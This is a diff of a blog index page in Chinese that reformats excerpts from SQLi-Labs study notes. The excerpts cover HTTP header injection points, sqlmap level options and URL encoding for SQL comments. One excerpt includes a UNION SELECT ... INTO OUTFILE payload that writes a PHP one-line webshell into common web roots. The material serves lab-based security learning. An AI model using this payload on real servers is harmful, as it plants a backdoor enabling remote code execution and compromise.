@@ -386,7 +386,9 @@
 
       
         
-          <h4 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、常见的HTTP注入点产生位置为【Referer】、【X-Forwarded-For】、【Cookie】、【X-Real-IP】、【Accept-Language】、【Authorization】。</span><br><span class="line">2、默认情况下SQLMAP只支持GET/POST参数的注入测试，但是当使用--level 参数且数值&gt;=2的时候也会检查cookie时面的参数，当&gt;=3的时候将检查User-agent和Referer。</span><br></pre></td></tr></table></figure>
+          <h4 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h4><blockquote>
+<p>1、常见的HTTP注入点产生位置为【Referer】、【X-Forwarded-For】、【Cookie】、【X-Real-IP】、【Accept-Language】、【Authorization】。<br>2、默认情况下SQLMAP只支持GET/POST参数的注入测试，但是当使用–level 参数且数值&gt;=2的时候也会检查cookie时面的参数，当&gt;=3的时候将检查User-agent和Referer。</p>
+</blockquote>
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2019/01/09/SQLi-Labs学习笔记11-21/#more" rel="contents">
@@ -532,7 +534,9 @@
 
       
         
-          <h4 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">写入一句话木马：</span><br><span class="line">id=223 union select &quot;&lt;?php &quot;,&quot; @eval($_POST[&apos;c&apos;]);&quot;, &quot; ?&gt;&quot;  into  outfile &quot;/var/www/html/mmm.php&quot; </span><br><span class="line">常用路径有：/var/www/, /var/www/html, /usr/local/apache2/htdocs, /var/www/nginx-default, /srv/www</span><br></pre></td></tr></table></figure>
+          <h4 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h4><blockquote>
+<p>写入一句话木马：<br>id=223 union select “&lt;?php “,” @eval($_POST[‘c’]);”, “ ?&gt;”  into  outfile “/var/www/html/mmm.php”<br>常用路径有：/var/www/, /var/www/html, /usr/local/apache2/htdocs, /var/www/nginx-default, /srv/www</p>
+</blockquote>
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2019/01/07/SQLi-Labs学习笔记7-10/#more" rel="contents">
@@ -678,7 +682,13 @@
 
       
         
-          <h4 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%20 -&gt; （空格）直接在浏览器中执行，要使用必须写%20</span><br><span class="line">%22 -&gt; &quot; </span><br><span class="line">%23 -&gt; # 直接在浏览器中执行，要使用必须写%23</span><br><span class="line">%25 -&gt; %</span><br><span class="line">%27 -&gt; &apos;</span><br><span class="line">注:</span><br><span class="line">1. 做注释使用#放在地址栏必须编码%23</span><br><span class="line">2. 做注释使用--放在地址栏必须加空格后再加字母(例如 -- a), 或者使用--+</span><br></pre></td></tr></table></figure>
+          <h4 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h4><blockquote>
+<p>%20 -&gt; （空格）直接在浏览器中执行，要使用必须写%20<br>%22 -&gt; “<br>%23 -&gt; # 直接在浏览器中执行，要使用必须写%23<br>%25 -&gt; %<br>%27 -&gt; ‘<br>注:</p>
+<ol>
+<li>做注释使用#放在地址栏必须编码%23</li>
+<li>做注释使用–放在地址栏必须加空格后再加字母(例如 – a), 或者使用–+</li>
+</ol>
+</blockquote>
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2019/01/07/SQLi-Labs学习笔记1-6/#more" rel="contents">
